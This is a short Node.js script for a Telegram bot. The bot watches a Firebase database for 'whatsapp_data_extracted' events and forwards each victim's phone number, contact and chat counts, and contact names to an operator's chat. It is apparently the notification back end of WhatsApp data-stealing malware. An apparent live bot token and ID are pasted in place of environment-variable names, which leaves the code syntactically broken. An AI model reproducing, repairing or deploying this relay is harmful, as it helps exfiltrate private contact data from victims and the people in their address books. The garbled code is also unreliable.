const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert({
            projectId: process.env.FIREBASE_PROJECT_ID,
            clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
            privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
        }),
        databaseURL: process.env.FIREBASE_DB_URL
    });
}
const db = admin.database();

const bot = new TelegramBot(process.env.8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk, { polling: true });
const 5975952682 = process.env.5975952682;

console.log('🤖 Bot started');

db.ref('telegram/events').on('child_added', async (snapshot) => {
    const event = snapshot.val();
    const data = event.data;

    if (event.event === 'whatsapp_data_extracted') {
        const waSnapshot = await db.ref(`whatsapp_data/${data.uid}`).once('value');
        const waData = waSnapshot.val() || {};

        let msg = `📊 *WHATSAPP DATA EXTRACTED*\n\n`;
        msg += `👤 Phone: ${data.phone}\n`;
        msg += `📱 Contacts: ${data.contacts}\n`;
        msg += `💬 Chats: ${data.chats}\n`;
        msg += `⏰ ${new Date(data.timestamp).toLocaleString()}\n\n`;

        if (waData.contacts) {
            const contacts = Object.values(waData.contacts);
            msg += `📱 *CONTACTS (${contacts.length})*\n`;
            contacts.slice(0, 10).forEach((c, i) => {
                msg += `${i+1}. ${c.name || c.number}\n`;
            });
            if (contacts.length > 10) msg += `... and ${contacts.length - 10} more\n`;
        }

        await bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
    }
});
